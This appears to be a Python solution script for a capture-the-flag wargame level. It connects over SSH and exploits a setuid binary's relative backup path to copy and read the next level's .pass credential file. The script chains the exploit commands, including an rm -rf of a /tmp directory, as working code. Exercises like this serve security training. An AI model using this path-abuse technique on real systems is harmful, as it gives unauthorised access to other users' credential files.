import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, connect_by_previous
from utils.text import print_output, print_title
from utils.base import save_token

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[1]

output = exec(client, f'./{binary_name} test', title='Simple execute binary with test arg')
print_output(output)
print_title('Binary open files')

print_title('Try to open next level pass file')
output = exec(client, f'./{binary_name} /home/users/level09/.pass', title='Simple execute binary with test arg')
print_output(output)
print_title(
    'Expectable output, but one noncence, '
    'binary try to execute from backup folder with context path, use this'
)
token = exec(client, f'rm -rf /tmp/backups && cd /tmp && mkdir -p backups/home/users/level09 && /home/users/{binary_name}/{binary_name} /home/users/level09/.pass && cat backups/home/users/level09/.pass')[0]
print_title("It's too easy...")

save_token(token)
